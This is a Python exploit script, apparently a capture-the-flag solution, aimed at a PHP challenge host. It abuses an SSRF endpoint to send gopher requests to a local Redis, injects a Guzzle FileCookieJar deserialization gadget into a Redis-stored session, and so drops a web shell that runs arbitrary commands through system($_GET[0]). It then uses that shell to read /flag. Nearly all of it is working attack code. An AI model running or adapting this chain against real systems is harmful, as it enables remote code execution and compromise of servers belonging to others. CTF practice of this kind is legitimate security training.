import urllib.parse, urllib.request, ssl, http.cookiejar, re

BASE = "https://<TARGET>.cloudeci1.ichunqiu.com"   # 替换为实际地址
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE

# ---------- PHP 序列化 ----------
def ser_string(s):
    if isinstance(s, str): s = s.encode()
    return b's:%d:"' % len(s) + s + b'";'
def ser_int(i): return b'i:%d;' % i
def ser_bool(b): return b'b:%d;' % (1 if b else 0)
def ser_array(items):
    out = b'a:%d:{' % len(items)
    for k, v in items:
        out += (b'i:%d;' % k) if isinstance(k, int) else ser_string(k)
        out += v
    return out + b'}'
def ser_object(cls, props):
    if isinstance(cls, str): cls = cls.encode()
    out = b'O:%d:"' % len(cls) + cls + (b'":%d:{' % len(props))
    for pn, v in props:
        out += ser_string(pn) + v
    return out + b'}'

def build_payload(php_code, filename):
    data = ser_array([
        (b'Name', ser_string(b'n')),
        (b'Value', ser_string(php_code)),
        (b'Domain', ser_string(b'127.0.0.1')),
        (b'Expires', ser_int(9999999999)),
        (b'Discard', ser_bool(False)),
    ])
    setcookie = ser_object(b'GuzzleHttp\\Cookie\\SetCookie', [
        (b'\x00GuzzleHttp\\Cookie\\SetCookie\x00data', data)])
    cookies = ser_array([(0, setcookie)])
    return ser_object(b'GuzzleHttp\\Cookie\\FileCookieJar', [
        (b'\x00GuzzleHttp\\Cookie\\FileCookieJar\x00filename', ser_string(filename)),
        (b'\x00GuzzleHttp\\Cookie\\FileCookieJar\x00storeSessionCookies', ser_bool(False)),
        (b'\x00GuzzleHttp\\Cookie\\CookieJar\x00cookies', cookies),
        (b'\x00GuzzleHttp\\Cookie\\CookieJar\x00strictMode', ser_bool(False)),
    ])

# ---------- SSRF 传输 ----------
def redis_cmd(*args):
    out = b"*"+str(len(args)).encode()+b"\r\n"
    for a in args:
        if isinstance(a, str): a = a.encode()
        out += b"$"+str(len(a)).encode()+b"\r\n"+a+b"\r\n"
    return out

def ssrf_redis(cmds):
    gopher = "gopher://127.0.0.1:6379/_" + urllib.parse.quote(cmds, safe='')
    data = urllib.parse.urlencode({'url': gopher}).encode()
    req = urllib.request.Request(BASE+"/flag.php", data=data, method='POST')
    req.add_header('Content-Type','application/x-www-form-urlencoded')
    r = urllib.request.urlopen(req, timeout=60, context=ctx)
    body = r.read().decode('utf-8','replace'); i = body.rfind("</pre>")
    return body[i+6:] if i!=-1 else body

def ssrf_http(raw_http):
    gopher = "gopher://127.0.0.1:80/_" + urllib.parse.quote(raw_http, safe='')
    data = urllib.parse.urlencode({'url': gopher}).encode()
    req = urllib.request.Request(BASE+"/flag.php", data=data, method='POST')
    req.add_header('Content-Type','application/x-www-form-urlencoded')
    r = urllib.request.urlopen(req, timeout=60, context=ctx)
    body = r.read().decode('utf-8','replace'); i = body.rfind("</pre>")
    return body[i+6:] if i!=-1 else body

# ---------- Step 1: 拿 session sid ----------
cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj),
                                     urllib.request.HTTPSHandler(context=ctx))
opener.open(BASE + "/index.php/login").read()
sid = next(c.value for c in cj if re.fullmatch(r'[0-9a-f]{32}', c.value))
session_key = "PHPREDIS_SESSION:" + sid

# ---------- Step 2: 构造 payload ----------
php_code = "<?php echo 'QWBSTART';system($_GET[0]);echo 'QWBEND';?>"
full_value = b'x|' + build_payload(php_code, b'/var/www/html/status.php')

# ---------- Step 3: EVAL 写入 Redis（NUL 拼装） ----------
chunks = full_value.split(b'\x00')
lua = "local z=string.char(0) local p={} for i=1,#ARGV do p[i]=ARGV[i] end redis.call('set',KEYS[1],table.concat(p,z)) return 1"
ssrf_redis(redis_cmd("EVAL", lua, "1", session_key, *chunks))

# ---------- Step 4: 触发 session_start -> __destruct ----------
opener.open(BASE + "/index.php/login").read()

# ---------- Step 5: 调 shell ----------
def run(cmd):
    raw = ("GET /status.php?0=" + urllib.parse.quote(cmd) + " HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n").encode()
    return ssrf_http(raw)

out = run("cat /flag")
print(out)   # 在 QWBSTART ... QWBEND 之间就是命令输出
